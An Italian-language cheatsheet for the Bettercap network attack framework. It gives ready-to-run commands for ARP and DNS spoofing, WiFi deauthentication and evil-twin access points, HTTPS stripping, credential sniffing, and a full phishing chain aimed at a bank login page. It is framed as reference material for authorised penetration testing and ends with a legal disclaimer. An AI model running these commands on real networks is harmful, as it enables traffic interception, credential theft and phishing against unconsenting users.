# 🦈 Bettercap - Cheatsheet Network Attack Framework

```
  ██████╗ ███████╗████████╗████████╗███████╗██████╗  ██████╗ █████╗ ██████╗ 
  ██╔══██╗██╔════╝╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗
  ██████╔╝█████╗     ██║      ██║   █████╗  ██████╔╝██║     ███████║██████╔╝
  ██╔══██╗██╔══╝     ██║      ██║   ██╔══╝  ██╔══██╗██║     ██╔══██║██╔═══╝ 
  ██████╔╝███████╗   ██║      ██║   ███████╗██║  ██║╚██████╗██║  ██║██║     
  ╚═════╝ ╚══════╝   ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     
            Swiss Army Knife for Network Attacks
```

<p align="center">
  <img src="https://img.shields.io/badge/Bettercap-MITM-blue?style=for-the-badge" alt="Bettercap">
  <img src="https://img.shields.io/badge/WiFi-Attacks-red?style=for-the-badge" alt="WiFi">
  <img src="https://img.shields.io/badge/Network-Recon-green?style=for-the-badge" alt="Network">
</p>

---

## 📋 Indice

- [Cos'è Bettercap](#-cosè-bettercap)
- [Installazione](#-installazione)
- [Uso Base](#-uso-base)
- [Ricognizione di Rete](#-ricognizione-di-rete)
- [ARP Spoofing (MITM)](#-arp-spoofing-mitm)
- [DNS Spoofing](#-dns-spoofing)
- [Attacchi WiFi](#-attacchi-wifi)
- [Downgrade HTTPS](#-downgrade-https)
- [Sniffing Credenziali](#-sniffing-credenziali)
- [Caplet](#-caplet)
- [Web UI](#-web-ui)
- [Riferimento Rapido](#-riferimento-rapido)

---

## 🎯 Cos'è Bettercap

**Bettercap** è il coltellino svizzero per WiFi, Bluetooth e ricognizione di rete. Successore di ettercap, offre funzionalità moderne:

- 🔍 **Network Recon** - Scoperta host, servizi
- 🎭 **Attacchi MITM** - ARP spoofing, DNS spoofing
- 📶 **Attacchi WiFi** - Deauth, evil twin, handshake capture
- 🔓 **Cattura Credenziali** - HTTP, HTTPS (downgrade)
- 📡 **Bluetooth/BLE** - Scoperta dispositivi, attacchi
- 🌐 **Web UI** - Interfaccia visuale

### Funzionalità

| Funzione | Descrizione |
|----------|-------------|
| **Modulare** | Estendibile con caplet |
| **Interattivo** | Shell comandi in tempo reale |
| **Scriptabile** | Automatizza con file caplet |
| **Web UI** | Interfaccia via browser |
| **Go Language** | Veloce, moderno, multipiattaforma |

---

## 🚀 Installazione

### Kali Linux (Preinstallato)

```bash
# Già installato su Kali
bettercap --help

# Aggiorna
sudo apt update && sudo apt install bettercap
```

### Debian/Ubuntu

```bash
sudo apt update
sudo apt install bettercap
```

### Da Sorgente

```bash
# Installa Go prima
sudo apt install golang

# Installa bettercap
go install github.com/bettercap/bettercap@latest

# Oppure
git clone https://github.com/bettercap/bettercap
cd bettercap
make build
sudo make install
```

### Installa UI (Opzionale)

```bash
# Scarica Web UI
sudo bettercap -eval "caplets.update; ui.update; quit"
```

---

## 💻 Uso Base

### Avvia Bettercap

```bash
# Avvio base (richiede root)
sudo bettercap

# Specifica interfaccia
sudo bettercap -iface eth0
sudo bettercap -iface wlan0

# Non interattivo (esegui comandi)
sudo bettercap -eval "net.probe on; net.show"

# Carica caplet file
sudo bettercap -caplet http-ui
```

### Shell Interattiva

```bash
# Dentro la shell bettercap
» help                      # Mostra tutti i comandi
» help net.probe            # Aiuto su modulo specifico
» net.show                  # Mostra host scoperti
» set arp.spoof.targets X   # Imposta variabile
» arp.spoof on              # Abilita modulo
» quit                      # Esci
```

### Gestione Moduli

```bash
# Lista tutti i moduli
» help

# Info modulo
» help arp.spoof

# Abilita modulo
» arp.spoof on

# Disabilita modulo
» arp.spoof off

# Visualizza impostazioni modulo
» get arp.spoof.*
```

---

## 🔍 Ricognizione di Rete

### Scoperta Host

```bash
# Abilita probe di rete
» net.probe on

# Mostra host scoperti
» net.show

# Output:
┌─────────────────────────────────────────────────────────────┐
│ IP               MAC                Vendor            Seen  │
├─────────────────────────────────────────────────────────────┤
│ 192.168.1.1      AA:BB:CC:DD:EE:FF  TP-Link           5s    │
│ 192.168.1.100    11:22:33:44:55:66  Apple             2s    │
└─────────────────────────────────────────────────────────────┘
```

### Info di Rete

```bash
# Mostra interfaccia corrente
» net.show

# Info interfaccia
» get net.interface.*

# Info gateway
» get gateway.*
```

### Opzioni Probe

```bash
# Imposta throttle probe
» set net.probe.throttle 10

# Modalità passiva (solo ascolto)
» set net.probe.passive true

# Timeout probe
» set net.probe.timeout 500
```

### Comandi Recon

```bash
# Recon completo
» net.recon on

# Pulisci host
» net.clear

# Mostra solo attivi
» set net.show.meta true
» net.show

# Esporta su file
» set net.sniff.output /tmp/capture.pcap
» net.sniff on
```

---

## 🎭 ARP Spoofing (MITM)

### ARP Spoof Base

```bash
# Avvia bettercap
sudo bettercap -iface eth0

# Abilita probing
» net.probe on

# Attendi, poi mostra host
» net.show

# Imposta target (vittima)
» set arp.spoof.targets 192.168.1.100

# Abilita ARP spoofing
» arp.spoof on

# Ora sei il MITM!
```

### Full Duplex (Entrambe le Direzioni)

```bash
# Spoofa sia vittima che gateway
» set arp.spoof.fullduplex true
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
```

### Spoof Intera Subnet

```bash
# Target tutti gli host (eccetto gateway)
» set arp.spoof.targets 192.168.1.0/24
» arp.spoof on

# Solo interno (non spoofare gateway)
» set arp.spoof.internal true
» arp.spoof on
```

### ARP Spoof + Sniff

```bash
# Setup MITM completo
» net.probe on
» set arp.spoof.targets 192.168.1.100
» set arp.spoof.fullduplex true
» arp.spoof on
» net.sniff on
```

---

## 🌐 DNS Spoofing

### Spoof DNS Base

```bash
# Imposta target DNS spoof
» set dns.spoof.domains example.com, *.example.com

# Imposta indirizzo di redirect (la tua macchina)
» set dns.spoof.address 192.168.1.50

# Abilita (richiede ARP spoof)
» arp.spoof on
» dns.spoof on
```

### Spoofa Tutti i Domini

```bash
# Wildcard - reindirizza tutto
» set dns.spoof.domains *
» set dns.spoof.address 192.168.1.50
» dns.spoof on
```

### Più Domini

```bash
# Lista domini
» set dns.spoof.domains facebook.com, *.facebook.com, twitter.com, *.twitter.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on
```

### DNS Spoof con HTTP Server

```bash
# Setup phishing completo
» set dns.spoof.domains login.example.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on

# Avvia HTTP server sulla tua macchina
» set http.server.path /var/www/phishing
» http.server on
```

---

## 📶 Attacchi WiFi

### Abilita Modalità WiFi

```bash
# Avvia con interfaccia WiFi
sudo bettercap -iface wlan0

# Abilita recon WiFi
» wifi.recon on

# Mostra AP scoperti
» wifi.show
```

### Ricognizione WiFi

```bash
# Mostra tutti gli AP
» wifi.show

# Output:
┌───────────────────────────────────────────────────────────────────┐
│ RSSI  BSSID              Ch  Enc     ESSID               Clients │
├───────────────────────────────────────────────────────────────────┤
│ -45   AA:BB:CC:DD:EE:FF   6  WPA2    HomeNetwork              3  │
│ -60   11:22:33:44:55:66   1  WPA2    Office_WiFi              1  │
└───────────────────────────────────────────────────────────────────┘
```

### Attacco Deauthentication

```bash
# Deautentica tutti i client da AP specifico
» wifi.deauth AA:BB:CC:DD:EE:FF

# Deautentica client specifico
» set wifi.deauth.station 11:22:33:44:55:66
» wifi.deauth AA:BB:CC:DD:EE:FF

# Deautenticazione continua
» set wifi.deauth.repeat 100
» wifi.deauth AA:BB:CC:DD:EE:FF
```

### Cattura Handshake

```bash
# Abilita recon WiFi
» wifi.recon on

# Imposta canale (stesso del target)
» wifi.recon.channel 6

# Cattura handshake
» set wifi.handshakes.file /tmp/handshakes/

# Deauth per forzare riconnessione
» wifi.deauth AA:BB:CC:DD:EE:FF

# Controlla handshake catturati
» wifi.show.wpa
```

### Attacco Evil Twin

```bash
# Clona AP
» set wifi.ap.ssid "Free WiFi"
» set wifi.ap.bssid AA:BB:CC:DD:EE:FF
» set wifi.ap.channel 6
» set wifi.ap.encryption false

# Avvia AP fake
» wifi.ap on

# Ora deautentica AP reale per forzare connessione client
» wifi.deauth <real_AP_BSSID>
```

### Attacco PMKID

```bash
# Attacco moderno senza client
» wifi.recon on
» wifi.assoc AA:BB:CC:DD:EE:FF

# PMKID catturato in handshakes folder
» wifi.show.wpa
```

---

## 🔒 Downgrade HTTPS

### SSL Strip (HSTS Bypass)

```bash
# Abilita prima ARP spoof
» arp.spoof on

# Abilita SSL strip
» set https.proxy.sslstrip true
» https.proxy on

# Oppure usa HTTP proxy
» http.proxy on
```

### Proxy HTTPS

```bash
# Setup proxy HTTPS
» set https.proxy.address 0.0.0.0
» set https.proxy.port 8080
» https.proxy on

# Con certificato
» set https.proxy.certificate /path/to/cert.pem
» set https.proxy.key /path/to/key.pem
» https.proxy on
```

### Cattura Traffico HTTPS

```bash
# MITM completo con HTTPS
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set https.proxy.sslstrip true
» https.proxy on
» net.sniff on
```

---

## 🔓 Sniffing Credenziali

### Credenziali HTTP

```bash
# Abilita sniffing
» net.sniff on

# Abilita sniffer locale
» set net.sniff.local true
» net.sniff on

# Filtra HTTP
» set net.sniff.filter "tcp port 80"
» net.sniff on
```

### Raccolta Credenziali

```bash
# Cattura credenziali completa
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set https.proxy.sslstrip true
» https.proxy on
» net.sniff on

# Le credenziali appaiono in tempo reale
```

### Salva su File

```bash
# Salva pacchetti catturati
» set net.sniff.output /tmp/capture.pcap
» net.sniff on

# Output verboso
» set net.sniff.verbose true
» net.sniff on
```

---

## 📜 Caplet

### Cosa sono i Caplet?

I caplet sono file script (.cap) che automatizzano i comandi bettercap.

### Caplet Integrati

```bash
# Lista caplet
» caplets.show

# Caplet comuni:
- http-ui       # Interfaccia web
- https-ui      # Interfaccia web sicura
- local-sniffer # Sniff traffico locale
- mitm          # MITM base
- pita          # Automazione attacchi WiFi
```

### Carica Caplet

```bash
# Da linea di comando
sudo bettercap -caplet http-ui

# Dentro bettercap
» caplet http-ui

# Da file
sudo bettercap -caplet /path/to/custom.cap
```

### Crea Caplet Personalizzato

```bash
# File: my-mitm.cap
net.probe on
sleep 5
set arp.spoof.targets 192.168.1.100
set arp.spoof.fullduplex true
arp.spoof on
net.sniff on
set net.sniff.verbose true
```

```bash
# Esegui caplet personalizzato
sudo bettercap -caplet my-mitm.cap
```

### Aggiorna Caplet

```bash
# Aggiorna tutti i caplet
» caplets.update
```

---

## 🌐 Web UI

### Avvia Web UI

```bash
# Installa UI prima
sudo bettercap -eval "caplets.update; ui.update; quit"

# Avvia con Web UI (HTTP)
sudo bettercap -caplet http-ui

# Avvia con HTTPS UI
sudo bettercap -caplet https-ui

# Accesso: https://127.0.0.1:8080/
# Credenziali default: user/pass
```

### Funzionalità Web UI

| Funzione | Descrizione |
|----------|-------------|
| **Dashboard** | Vista rete in tempo reale |
| **Hosts** | Dispositivi scoperti |
| **WiFi** | Reti wireless |
| **BLE** | Dispositivi Bluetooth |
| **Events** | Log attività |
| **Packets** | Traffico catturato |

### Configura Web UI

```bash
# Imposta credenziali
» set http.server.username admin
» set http.server.password secretpass

# Imposta porta
» set http.server.port 8080

# Bind address
» set http.server.address 0.0.0.0
```

---

## 📊 Riferimento Rapido

### Comandi Essenziali

| Comando | Descrizione |
|---------|-------------|
| `net.probe on` | Avvia scoperta host |
| `net.show` | Mostra host scoperti |
| `arp.spoof on` | Abilita ARP spoofing |
| `net.sniff on` | Avvia cattura pacchetti |
| `dns.spoof on` | Abilita DNS spoofing |
| `wifi.recon on` | Avvia scansione WiFi |
| `wifi.deauth BSSID` | Attacco deauth |
| `https.proxy on` | Abilita proxy HTTPS |

### Variabili Comuni

| Variabile | Descrizione |
|-----------|-------------|
| `arp.spoof.targets` | Vittime MITM |
| `arp.spoof.fullduplex` | Spoof bidirezionale |
| `dns.spoof.domains` | Domini da spoofare |
| `dns.spoof.address` | IP di redirect |
| `net.sniff.output` | File output PCAP |
| `wifi.ap.ssid` | Nome AP fake |

### Template Attacco MITM

```bash
# MITM base
sudo bettercap -iface eth0 -eval "
net.probe on;
sleep 3;
set arp.spoof.targets 192.168.1.100;
set arp.spoof.fullduplex true;
arp.spoof on;
net.sniff on"
```

### Template Attacco WiFi

```bash
# WiFi Deauth + Capture
sudo bettercap -iface wlan0 -eval "
wifi.recon on;
sleep 5;
wifi.deauth AA:BB:CC:DD:EE:FF"
```

### Attacco Phishing Completo

```bash
# DNS Spoof + Fake Site
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set dns.spoof.domains login.bank.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on
» set http.server.path /var/www/fake-login
» http.server on
```

---

## ⚠️ Disclaimer Legale

```
⚠️ ATTENZIONE: Bettercap è uno strumento potente che può intercettare 
il traffico di rete. Usalo solo su reti di TUA PROPRIETÀ o per cui hai 
PERMESSO SCRITTO ESPLICITO.

✅ Penetration test autorizzato
✅ Ricerca sicurezza (lab)
✅ Scopo didattico

❌ Intercettazione non autorizzata è ILLEGALE
❌ Mai usare su reti pubbliche
❌ Mai rubare credenziali
```

---

## 📚 Risorse

- [Bettercap Official](https://www.bettercap.org/)
- [Bettercap GitHub](https://github.com/bettercap/bettercap)
- [Bettercap Docs](https://www.bettercap.org/modules/)
- [Caplets](https://github.com/bettercap/caplets)

### Cheatsheet Correlate
- [Aircrack-ng](../Aircrack-ng/translations/README.it.md)
- [Wifite](../Wifite/translations/README.it.md)
- [Wireshark](../Wireshark/translations/README.it.md)

---

<p align="center">
  <b>🦈 Padroneggia gli attacchi di rete!</b><br>
  <i>Bettercap - Il coltellino svizzero del pentesting di rete</i>
</p>
